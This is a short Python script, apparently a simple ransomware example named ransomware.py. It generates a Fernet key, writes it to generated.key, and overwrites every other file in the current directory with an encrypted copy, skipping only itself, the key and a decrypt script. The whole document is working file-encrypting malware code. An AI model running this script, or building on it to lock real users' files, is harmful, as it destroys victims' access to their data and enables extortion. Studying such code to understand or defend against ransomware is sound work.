import os
import cryptography.fernet

files=[]

for file in os.listdir():
	if file == "ransomware.py" or file == "generated.key" or file == "ransomware_decrypt.py":
		continue #do not encrypt the current file we are working with or the key
	if os.path.isfile(file):
		files.append(file) #do not add if this is a directory, only if a file


key = cryptography.fernet.Fernet.generate_key()


with open("generated.key","wb") as generatedkey:
    generatedkey.write(key)

for file in files:
    with open(file,"rb") as the_file:
        content = the_file.read()
    content_encrypt = cryptography.fernet.Fernet(key).encrypt(content)
    with open(file,"wb") as the_file:
        the_file.write(content_encrypt)
